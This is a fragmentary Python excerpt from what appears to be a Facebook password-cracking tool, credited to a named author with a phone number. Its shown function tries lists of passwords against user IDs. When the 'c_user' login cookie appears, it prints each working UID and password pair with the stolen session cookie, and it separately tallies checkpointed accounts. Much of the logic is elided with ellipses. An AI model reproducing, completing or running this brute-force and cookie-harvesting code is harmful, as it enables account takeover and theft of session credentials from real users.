...
#    Respotary   Star  
#----------------------------------------------------------------------------------------------------------
#CREATE BY : MD JIBON AHMED JITU
#WHATSAPP : +8801867341765
#GITHUB : https://github.com/JIB0N
#----------------------------------------------------------------------------------------------------------
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[JIBON]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[JIBON-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[JIBON-CP] {cid}|{ps}")
